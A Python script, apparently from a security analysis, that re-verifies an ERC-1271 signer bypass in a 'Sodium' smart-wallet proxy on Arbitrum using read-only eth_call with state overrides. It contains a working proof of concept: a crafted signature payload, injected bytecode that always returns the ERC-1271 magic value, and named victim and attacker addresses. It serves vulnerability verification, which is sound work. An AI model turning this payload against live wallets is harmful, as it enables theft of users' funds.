#!/usr/bin/env python3
"""P5-01 re-verification #1: prove the ERC-1271 signer bypass on the LIVE Sodium
proxy via eth_call + state override at the latest Arbitrum block.

Read-only. No transaction is signed or sent. No keys.
"""
import json, sys
from Crypto.Hash import keccak
sys.path.insert(0, "/home/heisenberg/CA/sodium/analysis")
import lib_rpc as R

IMPL = "0xb5BC46dF04dEe31D219E7664122e29EEd9506b8b"
ENTRYPOINT = "0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789"
PROXY = "0x0209d8fcb0c36399eb49e018a245c55fd37d16bd"      # example victim (Verichains)
ATTACKER = "0x56362412AE17cac443AAFBAb4289946Ad958E8a1"   # real 2026-07 exploit signer
FRESH = "0x000000000000000000000000000000000000bEEF"      # fresh attacker contract
SEL_CHECK = "b6d5a063"                                    # checkValidSodiumSignature(bytes32,bytes)


def keccak256(b):
    h = keccak.new(digest_bits=256)
    h.update(b)
    return h.digest()


def enc_words(*vals):
    return "".join(v if isinstance(v, str) else format(v, "064x") for v in vals)


def enc_bytes(b):
    b = b[2:] if b.startswith("0x") else b
    n = len(b) // 2
    pad = (64 - (len(b) % 64)) % 64
    return format(n, "064x") + b + "0" * pad


# ERC-1271 contract returning magic 0x1626ba7e for any (hash, sig)
# PUSH32 <magic left aligned> ; PUSH1 0 ; MSTORE ; PUSH1 32 ; PUSH1 0 ; RETURN
MAGIC_CODE = "0x7f1626ba7e" + "00" * 28 + "60005260206000f3"


def main():
    blk = R.latest()
    print(f"# latest Arbitrum block: {blk}")
    impl_code = R.code(IMPL)
    print(f"# impl code size: {len(impl_code)//2 - 1} bytes")
    print(f"# impl codehash: 0x{keccak256(bytes.fromhex(impl_code[2:])).hex()}")

    # --- (a) exact signature-format check on the LIVE proxy -------------------
    # call checkValidSodiumSignature(bytes32 _hash, bytes _signature)
    #   _signature = 0x01 || attacker || 0x00   (22 bytes)
    h = bytes.fromhex("11" * 32)
    sig = "01" + ATTACKER[2:].lower() + "00"
    data = ("0x" + SEL_CHECK + h.hex() + format(0x40, "064x") + enc_bytes(sig))

    results = {}
    for label, attacker in [("real-2026-07-signer", ATTACKER), ("fresh-attacker", FRESH)]:
        sig = "01" + attacker[2:].lower() + "00"
        data = ("0x" + SEL_CHECK + h.hex() + format(0x40, "064x") + enc_bytes(sig))
        call = {"from": ENTRYPOINT, "to": PROXY, "data": data}
        override = {attacker: {"code": MAGIC_CODE}}
        r = R.rpc("eth_call", [call, hex(blk), override])
        res = r.get("result")
        if not res:
            print(f"# [{label}] eth_call error: {r}")
            results[label] = None
            continue
        words = [res[i:i + 64] for i in range(2, len(res), 64)]
        valid = int(words[0], 16) if words else None
        signer = "0x" + words[1][24:] if len(words) > 1 else None
        trustee = "0x" + words[2][24:] if len(words) > 2 else None
        print(f"# [{label}] valid={valid} signer={signer} trustee={trustee}")
        results[label] = {"valid": valid, "signer": signer, "trustee": trustee,
                          "expected_signer": attacker.lower()}

    # --- (b) negative control: an EOA signer must fail ------------------------
    eoa = "0x1111111111111111111111111111111111111111"
    sig = "01" + eoa[2:].lower() + "00"
    data = ("0x" + SEL_CHECK + h.hex() + format(0x40, "064x") + enc_bytes(sig))
    r = R.rpc("eth_call", [{"from": ENTRYPOINT, "to": PROXY, "data": data}, hex(blk)])
    res = r.get("result")
    if res:
        words = [res[i:i + 64] for i in range(2, len(res), 64)]
        print(f"# [control EOA signer] valid={int(words[0],16)} (expect 0)")
        results["control_eoa"] = int(words[0], 16)

    out = {"latest_block": blk, "impl": IMPL, "proxy": PROXY,
           "impl_codehash": "0x" + keccak256(bytes.fromhex(impl_code[2:])).hex(),
           "impl_code_size": len(impl_code) // 2 - 1, "checks": results}
    json.dump(out, open("/home/heisenberg/CA/sodium/analysis/bypass_reverify.json", "w"), indent=2)
    print("wrote analysis/bypass_reverify.json")


if __name__ == "__main__":
    main()
